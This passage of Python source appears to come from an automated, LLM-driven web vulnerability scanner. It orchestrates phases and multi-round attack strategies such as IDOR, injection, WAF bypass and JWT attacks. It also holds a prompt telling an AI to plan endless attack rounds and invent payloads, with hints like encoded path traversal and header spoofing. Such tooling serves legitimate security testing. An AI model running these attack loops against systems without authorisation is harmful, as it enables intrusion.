                            k: v for k, v in (self.context.get("stateful_crawl") or {}).items()
                            if k in ("forms", "multi_step_flows", "authenticated_endpoints")
                        },
                        "auto_register_result": {
                            k: v for k, v in (self.context.get("auto_register_result") or {}).items()
                            if k in ("registered", "authenticated", "test_email",
                                     "register_endpoint", "login_endpoint", "user_role")
                        } if self.context.get("auto_register_result") else {},
                        "phases_completed": [p[0] for p in phases],
                        "phases_optimized": self.context.get("_phases_were_optimized", False),
                    }
                    from sqlalchemy.orm.attributes import flag_modified as _fm2
                    _fm2(scan, "data")

                    # Log adaptive throttling stats
                    try:
                        from app.utils.http_client import get_throttle_stats
                        stats = get_throttle_stats()
                        if stats:
                            blocked_domains = {d: s for d, s in stats.items() if s.get("total_blocks", 0) > 0}
                            if blocked_domains:
                                await self.log(db, "throttle", f"Rate limiting detected on {len(blocked_domains)} domain(s): {blocked_domains}")
                    except Exception:
                        pass

                    # Complete — count vulns from DB (context list may miss deduped saves)
                    scan.status = ScanStatus.COMPLETED
                    scan.completed_at = datetime.utcnow()
                    scan.subdomains_found = len(self.context.get("subdomains", []))
                    scan.endpoints_found = len(self.context.get("endpoints", []))
                    # Count actual DB vulns (more accurate than context list)
                    from sqlalchemy import func as sqlfunc
                    db_vuln_count = (await db.execute(
                        select(sqlfunc.count(Vulnerability.id)).where(
                            Vulnerability.scan_id == self.scan_id
                        )
                    )).scalar() or 0
                    ctx_vuln_count = len(self.context.get("vulnerabilities", []))
                    scan.vulns_found = max(db_vuln_count, ctx_vuln_count)
                    await self.log(db, "complete", f"Scan completed. Found {scan.vulns_found} vulnerabilities.", "success")
                    await self._publish({
                        "type": "complete",
                        "vulns_found": scan.vulns_found,
                        "endpoints_found": scan.endpoints_found,
                        "subdomains_found": scan.subdomains_found,
                    })
                    await db.commit()

                    # Send scan completion notification
                    try:
                        from app.core.notifications import notify_scan_complete
                        notify_scan_complete(scan, target, scan.vulns_found or 0)
                    except Exception as e:
                        logger.warning(f"Scan complete notification failed: {e}")

                    # Notify for critical/high vulns found
                    await self._notify_critical_vulns(db, target)

                    # Learn from scan results
                    try:
                        from app.core.knowledge import KnowledgeBase
                        kb = KnowledgeBase()
                        await kb.learn_from_scan(db, self.scan_id)
                    except Exception as e:
                        logger.warning(f"Knowledge learning failed: {e}")

                    # Deep scan feedback analysis (tech-vuln correlations, strategy learning)
                    try:
                        from app.core.live_feeds import analyze_scan_feedback
                        await analyze_scan_feedback(db, max_scans=1)
                    except Exception as e:
                        logger.debug(f"Scan feedback analysis failed (non-fatal): {e}")

            except Exception as e:
                # Ensure session is clean before writing failure status
                try:
                    await db.rollback()
                except Exception:
                    pass
                try:
                    scan.status = ScanStatus.FAILED
                    scan.completed_at = datetime.utcnow()
                    await self.log(db, "error", f"Scan failed: {str(e)}", "error")
                    await db.commit()
                except Exception as commit_err:
                    logger.error(f"Failed to persist scan failure status: {commit_err}")
                    # Last resort: raw SQL to mark scan as failed
                    try:
                        await db.rollback()
                        await db.execute(
                            text("UPDATE scans SET status = 'FAILED', completed_at = NOW() WHERE id = :sid"),
                            {"sid": self.scan_id}
                        )
                        await db.commit()
                    except Exception:
                        logger.critical(f"Scan {self.scan_id} stuck as RUNNING — manual intervention needed")
                raise

    # --- Multi-Round Attack Strategies ---
    ROUND_STRATEGIES = [
        {
            "name": "Deep IDOR & Access Control",
            "context_flags": {"round_focus": "idor", "try_idor_patterns": True, "test_auth_bypass": True},
            "phases": ["endpoint", "auto_register", "vuln_scan", "exploit", "vuln_confirm", "auth_attack", "ai_analysis"],
        },
        {
            "name": "Injection & RCE Hunting",
            "context_flags": {"round_focus": "injection", "aggressive_payloads": True, "test_ssti": True, "test_nosql": True},
            "phases": ["vuln_scan", "nuclei", "payload_gen", "exploit", "vuln_confirm", "ai_analysis"],
        },
        {
            "name": "Infrastructure & Exposure",
            "context_flags": {"round_focus": "infrastructure", "scan_actuator": True, "scan_swagger": True, "scan_debug": True},
            "phases": ["endpoint", "sensitive_files", "vuln_scan", "exploit", "vuln_confirm", "ai_analysis"],
        },
        {
            "name": "Business Logic & API Abuse",
            "context_flags": {"round_focus": "business_logic", "test_race_conditions": True, "test_mass_assignment": True},
            "phases": ["endpoint", "graphql_attacks", "app_graph", "stateful_crawl", "auto_register", "vuln_scan", "exploit", "business_logic", "mass_assignment", "vuln_confirm", "ai_analysis"],
        },
        {
            "name": "Auth & JWT Deep Dive",
            "context_flags": {"round_focus": "auth_jwt", "brute_jwt": True, "test_alg_none": True, "test_password_reset": True},
            "phases": ["auth_attack", "vuln_scan", "exploit", "vuln_confirm", "ai_analysis"],
        },
        {
            "name": "WAF Bypass & Evasion",
            "context_flags": {"round_focus": "waf_bypass", "aggressive_waf_bypass": True, "encoding_tricks": True},
            "phases": ["waf", "payload_gen", "exploit", "vuln_confirm", "vuln_scan", "ai_analysis"],
        },
        {
            "name": "Full Re-Scan with New Intel",
            "context_flags": {"round_focus": "rescan", "use_previous_findings": True},
            "phases": ["endpoint", "sensitive_files", "vuln_scan", "nuclei", "payload_gen", "exploit", "vuln_confirm", "service_attack", "auth_attack", "request_smuggling", "cache_poisoning"],
        },
        {
            "name": "Stress & Edge Cases",
            "context_flags": {"round_focus": "edge_cases", "test_unicode": True, "test_large_payloads": True},
            "phases": ["stress_test", "vuln_scan", "exploit", "vuln_confirm", "ai_analysis"],
        },
        {
            "name": "AI Creative Attack",
            "context_flags": {"round_focus": "creative", "ai_creative_mode": True},
            "phases": ["ai_analysis", "payload_gen", "exploit", "vuln_confirm", "claude_collab", "attack_planner"],
        },
    ]

    async def _run_additional_rounds(self, db, scan, target, total_rounds: int, is_continuous: bool):
        """Run additional attack rounds. In continuous mode — truly infinite until user stops.

        Each round:
        1. Ask Claude AI: "what should we try next?" based on all previous attempts
        2. Claude picks strategy, mutates approach, suggests new paths
        3. Run the attack phases Claude recommends
        4. Learn from results, feed back into next round
        5. Sleep briefly between rounds to not hammer target
        Only stops when: user clicks Stop, or (non-continuous) max rounds reached.
        """
        import random

        phase_map = {
            "endpoint": self._phase_endpoint,
            "browser_scan": self._phase_browser_scan,
            "app_graph": self._phase_app_graph,
            "stateful_crawl": self._phase_stateful_crawl,
            "sensitive_files": self._phase_sensitive_files,
            "vuln_scan": self._phase_vuln_scan,
            "nuclei": self._phase_nuclei,
            "ai_analysis": self._phase_ai_analysis,
            "payload_gen": self._phase_payload_gen,
            "waf": self._phase_waf,
            "exploit": self._phase_exploit,
            "service_attack": self._phase_service_attack,
            "auth_attack": self._phase_auth_attack,
            "mfa_bypass": self._phase_mfa_bypass,
            "account_enumeration": self._phase_account_enumeration,
            "business_logic": self._phase_business_logic,
            "graphql_attacks": self._phase_graphql_attacks,
            "request_smuggling": self._phase_request_smuggling,
            "mass_assignment": self._phase_mass_assignment,
            "cache_poisoning": self._phase_cache_poisoning,
            "stress_test": self._phase_stress_test,
            "claude_collab": self._phase_claude_collab,
            "attack_planner": self._phase_attack_planner,
            "vuln_confirm": self._phase_vuln_confirm,
        }

        # For continuous mode: no cap. For multi-round: respect the limit.
        if is_continuous:
            max_rounds = 999999  # effectively infinite
        else:
            max_rounds = total_rounds

        vulns_after_round1 = len(self.context.get("vulnerabilities", []))
        round_history = []  # Track what we tried and what happened
        round_num = 1  # Will start from 2

        for round_num in range(2, max_rounds + 1):
            # === CHECK IF USER STOPPED ===
            await db.refresh(scan)
            if scan.status in (ScanStatus.STOPPED, ScanStatus.PAUSED):
                await self.log(db, "multi_round",
                    f"Scan stopped by user at round {round_num}.", "warning")
                await db.commit()
                break

            # === ASK AI: WHAT SHOULD WE TRY NEXT? ===
            ai_strategy = await self._ai_plan_next_round(
                db, scan, target, round_num, round_history
            )

            strategy_name = ai_strategy.get("strategy_name", f"Round {round_num}")
            strategy_phases = ai_strategy.get("phases", ["vuln_scan", "exploit", "ai_analysis"])
            strategy_flags = ai_strategy.get("context_flags", {})
            ai_reasoning = ai_strategy.get("reasoning", "")

            await self.log(db, "multi_round",
                f"=== Round {round_num}: {strategy_name} ===",
                "info")
            if ai_reasoning:
                await self.log(db, "multi_round",
                    f"AI reasoning: {ai_reasoning[:500]}", "info")
            await self._publish({
                "type": "round",
                "round": round_num,
                "total_rounds": "∞" if is_continuous else max_rounds,
                "strategy": strategy_name,
            })
            await db.commit()

            # === APPLY STRATEGY ===
            self.context["current_round"] = round_num
            self.context["round_strategy"] = strategy_name
            for key, val in strategy_flags.items():
                self.context[key] = val

            # Inject AI-suggested custom payloads/paths (normalize to dicts)
            base_url = self.context.get("base_url", "")
            if ai_strategy.get("custom_payloads"):
                normalized_payloads = []
                for p in ai_strategy["custom_payloads"]:
                    if isinstance(p, str):
                        normalized_payloads.append({
                            "payload": p,
                            "target_url": base_url,
                            "vuln_type": "generic",
                            "method": "GET",
                            "source": "ai_round",
                        })
                    elif isinstance(p, dict):
                        p.setdefault("payload", "")
                        p.setdefault("target_url", base_url)
                        p.setdefault("vuln_type", "generic")
                        p.setdefault("method", "GET")
                        p.setdefault("source", "ai_round")
                        normalized_payloads.append(p)
                existing = self.context.get("payloads", [])
                self.context["payloads"] = existing + normalized_payloads
            if ai_strategy.get("custom_endpoints"):
                normalized_eps = []
                for ep in ai_strategy["custom_endpoints"]:
                    if isinstance(ep, str):
                        url = ep if ep.startswith("http") else base_url.rstrip("/") + "/" + ep.lstrip("/")
                        normalized_eps.append({
                            "url": url,
                            "type": "general",
                            "method": "GET",
                        })
                    elif isinstance(ep, dict):
                        ep.setdefault("url", base_url)
                        ep.setdefault("type", "general")
                        ep.setdefault("method", "GET")
                        normalized_eps.append(ep)
                existing = self.context.get("endpoints", [])
                existing_urls = {e["url"] if isinstance(e, dict) else e for e in existing}
                new_eps = [ep for ep in normalized_eps if ep["url"] not in existing_urls]
                self.context["endpoints"] = existing + new_eps
                if new_eps:
                    await self.log(db, "multi_round",
                        f"AI suggested {len(new_eps)} new endpoints to test", "info")

            vulns_before_round = len(self.context.get("vulnerabilities", []))

            # === RUN PHASES ===
            for i, phase_name in enumerate(strategy_phases):
                # Check stop again mid-round
                if i % 3 == 0 and i > 0:
                    await db.refresh(scan)
                    if scan.status in (ScanStatus.STOPPED, ScanStatus.PAUSED):
                        break

                phase_func = phase_map.get(phase_name)
                if not phase_func:
                    continue
                await self._run_phase(db, scan, f"R{round_num}:{phase_name}", 100, phase_func)

            # === RESULTS ===
            vulns_after_round = len(self.context.get("vulnerabilities", []))
            new_this_round = vulns_after_round - vulns_before_round

            round_record = {
                "round": round_num,
                "strategy": strategy_name,
                "new_findings": new_this_round,
                "total_findings": vulns_after_round,
                "phases_run": strategy_phases,
            }
            round_history.append(round_record)

            await self.log(db, "multi_round",
                f"Round {round_num} done: +{new_this_round} new findings "
                f"(total: {vulns_after_round})",
                "success" if new_this_round > 0 else "info")

            # Update scan stats live
            scan.vulns_found = vulns_after_round
            await db.commit()

            # === CLEAN UP ROUND FLAGS ===
            for key in strategy_flags:
                self.context.pop(key, None)

            # === BREATHE — don't hammer the target ===
            # Longer pause if no findings (back off), shorter if productive
            if is_continuous:
                pause = 5 if new_this_round > 0 else 15
                await self.log(db, "multi_round",
                    f"Pausing {pause}s before next round...", "info")
                await db.commit()
                await asyncio.sleep(pause)

        # === FINAL WRAP-UP ===
        total_new = len(self.context.get("vulnerabilities", [])) - vulns_after_round1
        await self.log(db, "multi_round",
            f"Multi-round complete after {round_num} rounds. "
            f"+{total_new} new findings beyond round 1. "
            f"Total: {len(self.context.get('vulnerabilities', []))}",
            "success")
        await db.commit()

        # Re-run evidence and report to capture everything
        await self._run_phase(db, scan, "evidence_final", 98, self._phase_evidence)
        await self._run_phase(db, scan, "report_final", 99, self._phase_report)

    async def _ai_plan_next_round(self, db, scan, target, round_num: int, round_history: list) -> dict:
        """Ask Claude AI to plan the next attack round based on everything tried so far.

        Returns dict with: strategy_name, phases, context_flags, reasoning,
        custom_payloads, custom_endpoints
        """
        from app.ai.llm_engine import LLMEngine
        import random

        # Build history summary for AI
        history_text = ""
        if round_history:
            history_text = "PREVIOUS ROUNDS:\n"
            for rh in round_history[-10:]:  # Last 10 rounds
                history_text += (
                    f"  Round {rh['round']}: {rh['strategy']} → "
                    f"+{rh['new_findings']} findings, phases: {', '.join(rh['phases_run'])}\n"
                )

        # Gather what we know about the target
        endpoints = self.context.get("endpoints", [])
        techs = self.context.get("technologies", {})
        vulns = self.context.get("vulnerabilities", [])
        waf = self.context.get("waf_info")
        ports = self.context.get("ports", {})

        # Query KB for insights on similar targets/technologies
        kb_context = ""
        try:
            from app.core.knowledge import KnowledgeBase
            kb = KnowledgeBase()
            tech_names = []
            if isinstance(techs, dict):
                tech_names = list(techs.get("summary", {}).keys())[:5]
            elif isinstance(techs, list):
                tech_names = [str(t) for t in techs[:5]]
            for tech in tech_names:
                payloads = await kb.get_effective_payloads(tech.lower())
                if payloads:
                    kb_context += f"\nKB: Effective payloads for {tech}: {json.dumps(payloads[:3], default=str)[:300]}"
            strategies = await kb.query_patterns("scan_strategy", context={"technologies": tech_names})
            if strategies:
                kb_context += f"\nKB strategies for this tech stack: {json.dumps(strategies[:2], default=str)[:300]}"
        except Exception:
            pass

        # Build vuln summary for AI context
        vuln_types_found = {}
        for v in vulns:
            vt = v.get("vuln_type") or v.get("type", "unknown")
            vuln_types_found[vt] = vuln_types_found.get(vt, 0) + 1
        vuln_summary = ", ".join(f"{k}:{v}" for k, v in sorted(vuln_types_found.items(), key=lambda x: -x[1]))

        prompt = f"""You are an elite penetration tester doing round {round_num} of a continuous deep scan.
Target: {target.domain}
Technologies: {json.dumps(techs, default=str)[:500]}
Open ports: {json.dumps(ports, default=str)[:300]}
WAF: {waf or 'Unknown'}
Endpoints found: {len(endpoints)} (sample: {json.dumps(endpoints[:15], default=str)[:500]})
Vulnerabilities found so far: {len(vulns)} ({vuln_summary})
{history_text}
{kb_context}

Your job: plan the NEXT attack round. You must try something DIFFERENT from previous rounds.
Think like a creative pentester who refuses to give up. Consider:
- Unusual parameter names, hidden API versions (/v1/, /v2/, /internal/)
- Trying different HTTP methods (PUT, PATCH, DELETE, OPTIONS) on known endpoints
- Path traversal with encoding: ..%2f, ..%252f, %00
- Adding auth headers: X-Forwarded-For: 127.0.0.1, X-Original-URL
- Testing backup/dev endpoints: /api-dev/, /api-test/, /old/, /backup/
- GraphQL introspection if /graphql exists
- WebSocket endpoints
- CORS origin reflection with credentials
- Cache poisoning via Host header
- HTTP request smuggling
- Parameter pollution (duplicate params)
- JSON content type confusion (send XML to JSON endpoints)

{'IMPORTANT: Previous rounds found NOTHING new. You MUST change approach drastically. Try completely different techniques, paths, encodings, methods.' if round_history and all(r['new_findings'] == 0 for r in round_history[-3:]) else ''}

Respond in JSON:
{{
  "strategy_name": "<creative name for this round>",
  "reasoning": "<why this approach, what you expect to find>",
  "phases": ["<list of phases to run from: endpoint, sensitive_files, vuln_scan, nuclei, ai_analysis, payload_gen, waf, exploit, vuln_confirm, service_attack, auth_attack, stress_test, claude_collab>"],
  "context_flags": {{"<key>": <value>, ...}},
  "custom_endpoints": ["<new paths to test that scanner might have missed>"],
  "custom_payloads": ["<specific payloads to try>"]
}}"""

        llm = LLMEngine()
        try:
            result = await llm.analyze_json(prompt, temperature=0.7 + min(round_num * 0.02, 0.25))
            # Validate phases
            valid_phases = set(["endpoint", "browser_scan", "sensitive_files", "vuln_scan",
                               "nuclei", "ai_analysis", "payload_gen", "waf", "exploit",
                               "vuln_confirm", "service_attack", "auth_attack", "stress_test",
                               "claude_collab", "graphql_attacks", "account_enumeration",
                               "mfa_bypass", "business_logic", "request_smuggling",
                               "mass_assignment", "cache_poisoning", "attack_planner",
                               "auto_register", "app_graph", "stateful_crawl"])
            result["phases"] = [p for p in result.get("phases", []) if p in valid_phases]
            if not result["phases"]:
                result["phases"] = ["vuln_scan", "exploit", "ai_analysis"]
            return result
        except Exception as e:
            await self.log(db, "multi_round",
                f"AI planning failed ({e}), using fallback strategy", "warning")
            await db.commit()
            # Fallback: cycle through predefined strategies with mutations
            strategy = self.ROUND_STRATEGIES[(round_num - 2) % len(self.ROUND_STRATEGIES)]
            # Mutate: randomly shuffle phases, add claude_collab
            phases = list(strategy["phases"])
            random.shuffle(phases)
            if "claude_collab" not in phases:
                phases.append("claude_collab")
            return {
                "strategy_name": f"{strategy['name']} (mutated)",
                "reasoning": "AI unavailable, using mutated predefined strategy",
                "phases": phases,
                "context_flags": strategy["context_flags"],
                "custom_endpoints": [],
                "custom_payloads": [],
            }
        finally:
            await llm.close()

    def _get_phases_for_type(self, scan_type: str) -> list[tuple]:
        """Return list of (phase_name, progress%, phase_func) for the scan type."""
        all_phases = [
            ("recon", 4, self._phase_recon),
            ("subdomain", 9, self._phase_subdomain),
            ("portscan", 15, self._phase_portscan),
            ("fingerprint", 20, self._phase_fingerprint),
            ("attack_routing", 23, self._phase_attack_routing),
            ("endpoint", 28, self._phase_endpoint),
            ("browser_scan", 29, self._phase_browser_scan),
            ("graphql_attacks", 30, self._phase_graphql_attacks),
            ("app_graph", 32, self._phase_app_graph),
            ("stateful_crawl", 34, self._phase_stateful_crawl),
            ("auto_register", 38, self._phase_auto_register),
            ("sensitive_files", 42, self._phase_sensitive_files),
            ("vuln_scan", 46, self._phase_vuln_scan),
            ("nuclei", 52, self._phase_nuclei),
            ("ai_analysis", 56, self._phase_ai_analysis),
            ("payload_gen", 59, self._phase_payload_gen),
            ("waf", 63, self._phase_waf),
            ("exploit", 68, self._phase_exploit),
            ("service_attack", 73, self._phase_service_attack),
            ("auth_attack", 75, self._phase_auth_attack),
            ("account_enumeration", 76, self._phase_account_enumeration),
            ("mfa_bypass", 77, self._phase_mfa_bypass),
            ("business_logic", 78, self._phase_business_logic),
            ("request_smuggling", 80, self._phase_request_smuggling),
            ("mass_assignment", 82, self._phase_mass_assignment),
            ("cache_poisoning", 84, self._phase_cache_poisoning),
            ("stress_test", 86, self._phase_stress_test),
            ("vuln_confirm", 88, self._phase_vuln_confirm),
            ("claude_collab", 90, self._phase_claude_collab),
            ("attack_planner", 94, self._phase_attack_planner),
            ("evidence", 97, self._phase_evidence),
            ("report", 100, self._phase_report),
        ]

        if scan_type == "quick":
            # Skip heavy phases for quick scan
            skip = {"subdomain", "portscan", "fingerprint", "nuclei", "waf",
                    "evidence", "service_attack", "auth_attack", "stress_test",
                    "stateful_crawl", "business_logic", "auto_register",
                    "request_smuggling", "mass_assignment", "cache_poisoning",
                    "mfa_bypass", "account_enumeration", "browser_scan"}
            phases = [(n, p, f) for n, p, f in all_phases if n not in skip]
            # Recalculate progress evenly
            for i, (n, _, f) in enumerate(phases):
                phases[i] = (n, int((i + 1) / len(phases) * 100), f)
            return phases
        elif scan_type == "stealth":
            # All phases but with stealth context flag
            self.context["stealth"] = True
            return all_phases
        elif scan_type == "recon":
            return [
                ("recon", 25, self._phase_recon),
                ("subdomain", 50, self._phase_subdomain),
                ("portscan", 75, self._phase_portscan),
                ("fingerprint", 100, self._phase_fingerprint),
            ]
        elif scan_type == "bounty":
            # Bug bounty: all phases, with bounty-specific filtering
            self.context["bounty_mode"] = True
            return all_phases
        else:
            return all_phases

    async def _maybe_optimize_phases(
        self, db, phases: list[tuple], resume_from_index: int
    ) -> list[tuple]:
        """Run AI phase optimization after fingerprint completes.

        Splits phases into fixed recon phases (recon→subdomain→portscan→fingerprint)
        and optimizable attack phases. Asks PhaseOptimizer to reorder attack phases.
        Returns the full phase list with attack phases reordered.
        Falls back to default order silently on any error.
        """
        from app.core.phase_optimizer import FIXED_RECON_PHASES

        # Don't optimize if we're resuming past fingerprint
        fingerprint_idx = None
        for i, (name, _, _) in enumerate(phases):
            if name == "fingerprint":
                fingerprint_idx = i
                break

        if fingerprint_idx is None:
            return phases  # No fingerprint phase (e.g., quick scan without it)

        if resume_from_index >= fingerprint_idx:
            return phases  # Already past fingerprint on resume — keep order

        # Only optimize for scan types with attack phases
        if len(phases) <= fingerprint_idx + 1:
            return phases  # Recon-only scan

        # Split into recon (fixed) and attack (optimizable) phases
        recon_phases = phases[:fingerprint_idx + 1]
        attack_phases = phases[fingerprint_idx + 1:]

        # Run recon phases first to gather data for optimization
        # (they should already be completed by the execution loop,
        # but we need the data — this method is called BEFORE the loop)
        # Actually, this is called before the loop, so we need to run recon first.
        # Better approach: just run recon phases, then optimize, then rebuild.

        # We need recon data to optimize. Since this is called before the main loop,
        # we run recon phases now, then optimize attack phases, then return
        # the combined list with recon phases marked so the loop skips them.

        # Run recon phases
        result = await db.execute(select(Scan).where(Scan.id == self.scan_id))
        scan = result.scalar_one_or_none()
        if not scan:
            return phases

        for idx, (phase_name, progress, phase_func) in enumerate(recon_phases):
            if idx <= resume_from_index:
                continue
            await self._run_phase(db, scan, phase_name, progress, phase_func, phase_index=idx)

        # Now we have recon data in self.context — run optimizer
        attack_phase_names = [name for name, _, _ in attack_phases]
        attack_func_map = {name: func for name, _, func in attack_phases}

        try:
            from app.ai.llm_engine import LLMEngine
            llm = LLMEngine()
            optimizer = PhaseOptimizer()
            optimized_names = await optimizer.optimize_phases(
                db, self.context, attack_phase_names, llm
            )
            await llm.close()

            # Check if order actually changed
            if optimized_names != attack_phase_names:
                # Log the optimization
                skipped = [n for n in attack_phase_names if n not in optimized_names]
                await self.log(
                    db, "phase_optimizer",
                    f"AI optimized phase order: {optimized_names}"
                    + (f" (skipped: {skipped})" if skipped else ""),
                )
                await db.commit()

                # Rebuild attack phases with new order and recalculated progress
                total_phases = len(recon_phases) + len(optimized_names)
                new_attack_phases = []
                for i, name in enumerate(optimized_names):
                    func = attack_func_map.get(name)
                    if func is None:
                        continue  # Unknown phase — skip
                    progress_pct = int(
                        (len(recon_phases) + i + 1) / total_phases * 100
                    )
                    new_attack_phases.append((name, progress_pct, func))

                # Mark recon phases with resume_from_index so main loop skips them
                # We do this by returning a combined list where recon phases
                # are already completed (the main loop checks idx <= resume_from_index)
                # But since we can't modify resume_from_index from here, we set a flag
                self.context["_recon_already_run"] = fingerprint_idx
                self.context["_phases_were_optimized"] = True
                return recon_phases + new_attack_phases
            else:
                await self.log(db, "phase_optimizer", "AI kept default phase order")
                await db.commit()
                self.context["_recon_already_run"] = fingerprint_idx
                return phases

        except Exception as e:
            logger.warning("Phase optimization failed, using default order: %s", e)
            try:
                await self.log(
                    db, "phase_optimizer",
                    f"Phase optimization skipped (fallback to default): {e}",
                    "warning",
                )
                await db.commit()
            except Exception:
                pass
            self.context["_recon_already_run"] = fingerprint_idx
            return phases

    async def _run_phase(self, db, scan, phase_name, progress, phase_func, phase_index: int = -1):
        # Check if scan was stopped/paused
        await db.refresh(scan)
        if scan.status in (ScanStatus.STOPPED, ScanStatus.PAUSED):
            return

        await self.update_progress(db, scan, phase_name, progress)
        await self.log(db, phase_name, f"Starting phase: {phase_name}")
        await db.commit()

        try:
            await phase_func(db)
            await self.log(db, phase_name, f"Phase {phase_name} completed", "success")
            await db.commit()
            # Save checkpoint after successful phase completion
            if phase_index >= 0:
                await self._save_checkpoint(db, scan, phase_name, phase_index)
        except Exception as e:
            # Rollback corrupted session before attempting any further writes
            try:
                await db.rollback()
            except Exception:
                pass
            try:
                await self.log(db, phase_name, f"Phase {phase_name} error: {str(e)}", "error")
                await db.commit()
            except Exception:
                try:
                    await db.rollback()
                except Exception:
                    pass
                logger.error(f"Phase {phase_name} error (could not log to DB): {e}")
            # Save checkpoint even on failure so we skip this phase on resume
            if phase_index >= 0:
                try:
                    await self._save_checkpoint(db, scan, phase_name, phase_index)
                except Exception:
                    try:
                        await db.rollback()
                    except Exception:
                        pass
            # Don't fail entire scan on single phase failure
            # AI will adapt strategy

    async def _phase_recon(self, db: AsyncSession):
        recon = ReconModule()
        result = await recon.run(self.context["domain"], self.context.get("base_url"), context=self.context)

        # Enrich with external APIs (Shodan, SecurityTrails)
        external = ExternalAPIs()
        if external.shodan.available or external.securitytrails.available:
            ip = None
            for rec in result.get("dns_records", []):
                if rec.get("type") == "A":
                    ip = rec.get("value")
                    break
            enrichment = await external.enrich_recon(self.context["domain"], ip)
            result["external_enrichment"] = enrichment
            if enrichment.get("sources"):
                await self.log(db, "recon", f"External APIs enriched: {', '.join(enrichment['sources'])}")

        self.context["recon_data"] = result

        # Extract WAF intel from recon for downstream phases
        main_page_intel = result.get("main_page_intel", {})
        waf_info = main_page_intel.get("waf", {})
        if waf_info.get("detected"):
            self.context["waf_info"] = waf_info
            await self.log(db, "recon",
                f"WAF detected: {waf_info.get('waf_name', 'unknown')} "
                f"(confidence: {waf_info.get('confidence', 0):.0%})", "warning")

        # Extract tech leaks
        tech_leaks = main_page_intel.get("tech_leaks", [])
        if tech_leaks:
            leak_summary = ", ".join(f"{t['name']}={t['value']}" for t in tech_leaks[:5])
            await self.log(db, "recon", f"Tech leaks: {leak_summary}")

        # Secrets found on main page
        secrets = main_page_intel.get("secrets", [])
        if secrets:
            await self.log(db, "recon",
                f"Secrets found on main page: {len(secrets)} ({', '.join(s['type'] for s in secrets[:3])})", "warning")

        target_result = await db.execute(select(Target).where(Target.id == self.context["target_id"]))
        target = target_result.scalar_one()
        target.recon_data = result

        dns_count = len(result.get("dns_records", []))
        await self.log(db, "recon", f"Recon complete: {dns_count} DNS records found")

    async def _phase_subdomain(self, db: AsyncSession):
        if self.context.get("is_internal"):
            await self.log(db, "subdomain", "Skipped — internal target")
            return

        subdomain_mod = SubdomainModule()
        subdomains = await subdomain_mod.run(self.context["domain"])

        # Merge SecurityTrails subdomains if available
        enrichment = self.context.get("recon_data", {}).get("external_enrichment", {})
        st_subs = enrichment.get("securitytrails_subdomains", [])
        if st_subs:
            existing = set(subdomains)
            added = 0
            for s in st_subs:
                if s not in existing:
                    subdomains.append(s)
                    existing.add(s)
                    added += 1
            if added:
                await self.log(db, "subdomain", f"SecurityTrails added {added} new subdomains")

        # Scope filter subdomains
        if hasattr(self, '_scope'):
            before = len(subdomains)
            subdomains = [s for s in subdomains if self._scope.is_in_scope(f"https://{s}")]
            if before != len(subdomains):
                await self.log(db, "subdomain", f"Scope filter: {before} → {len(subdomains)} subdomains")
        self.context["subdomains"] = subdomains

        # Check for subdomain takeover (built-in CNAME fingerprinting)
        takeover_findings = getattr(subdomain_mod, "takeover_findings", []) or []
        if takeover_findings:
            for finding in takeover_findings:
                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=finding["title"][:500],
                    vuln_type=VulnType.MISCONFIGURATION,
                    severity=Severity.CRITICAL,
                    url=finding.get("url", "")[:2000],
                    description=finding.get("description", ""),
                    impact=finding.get("impact", ""),
                    remediation=finding.get("remediation", ""),
                    response_data={
                        "cname": finding.get("cname"),
                        "service": finding.get("service"),
                        "indicator": finding.get("indicator"),
                    },
                )
                await self._save_vuln_deduped(db, vuln)
            await self.log(db, "subdomain", f"Found {len(takeover_findings)} subdomain takeovers (CNAME fingerprint)", "warning")

        # Check for subdomain takeover (extended module)
        from app.modules.subdomain_takeover import SubdomainTakeoverModule
        takeover_mod = SubdomainTakeoverModule()
        takeover_results = await takeover_mod.check(self.context)
        if takeover_results:
            self.context.setdefault("scan_results", []).extend(takeover_results)
            await self.log(db, "subdomain", f"Found {len(takeover_results)} potential subdomain takeovers", "warning")

        target_result = await db.execute(select(Target).where(Target.id == self.context["target_id"]))
        target = target_result.scalar_one()
        target.subdomains = subdomains

        await self.log(db, "subdomain", f"Found {len(subdomains)} subdomains")

    async def _phase_portscan(self, db: AsyncSession):
        if self.context.get("is_internal"):
            # For internal targets, just note the known port
            domain = self.context["domain"]
            host = domain.split(":")[0] if ":" in domain else domain
            port = domain.split(":")[1] if ":" in domain else "80"
            self.context["ports"] = {host: [{"port": int(port), "state": "open", "service": "http"}]}
            await self.log(db, "portscan", f"Internal target — port {port} assumed open")
            return

        portscan = PortScanModule()
        targets = [self.context["domain"]] + self.context["subdomains"][:10]

        # Use scan_type from config if available
        config = self.context.get("config") or {}
        port_scan_type = config.get("port_scan_type", "quick")
        scan_results = await portscan.run(targets, scan_type=port_scan_type)

        # Extract ports list from new format (backward compatible)
        ports = {}
        risky_services = []
        for host, data in scan_results.items():
            if isinstance(data, dict):
                ports[host] = data.get("ports", [])
                risky_services.extend(data.get("risky_services", []))
            else:
                ports[host] = data  # old format: list of port dicts

        self.context["ports"] = ports
        self.context["risky_services"] = risky_services

        target_result = await db.execute(select(Target).where(Target.id == self.context["target_id"]))
        target = target_result.scalar_one()
        target.ports = ports

        total_open = sum(len(v) if isinstance(v, list) else 0 for v in ports.values())
        await self.log(db, "portscan", f"Found {total_open} open ports across {len(ports)} hosts")
        if risky_services:
            risky_names = [f"{r['service']}:{r['port']}" for r in risky_services[:5]]
            await self.log(db, "portscan", f"Risky services: {', '.join(risky_names)}", level="warning")

    async def _phase_fingerprint(self, db: AsyncSession):
        fingerprint = FingerprintModule()
        base_url = self.context.get("base_url")
        technologies = await fingerprint.run(
            self.context["domain"], self.context["subdomains"][:10], base_url=base_url
        )
        self.context["technologies"] = technologies

        target_result = await db.execute(select(Target).where(Target.id == self.context["target_id"]))
        target = target_result.scalar_one()
        target.technologies = technologies

        tech_summary = technologies.get("summary", {})
        await self.log(db, "fingerprint", f"Detected technologies: {list(tech_summary.keys())[:10]}")

    async def _phase_attack_routing(self, db: AsyncSession):
        """Analyze discoveries so far and build an adaptive attack plan."""
        router = AttackRouter()
        plan = router.analyze(self.context)
        if plan:
            # Log top-priority actions
            top_actions = [f"{a['action']} (P{a['priority']})" for a in plan[:5]]
            await self.log(db, "attack_routing",
                f"Attack plan: {len(plan)} actions — top: {', '.join(top_actions)}")

            # If rate limiting was detected, reduce concurrency for remaining phases
            from app.core.attack_router import get_throttle_params
            throttle = get_throttle_params(self.context)
            if throttle:
                new_limit = throttle.get("max_rps", 2)
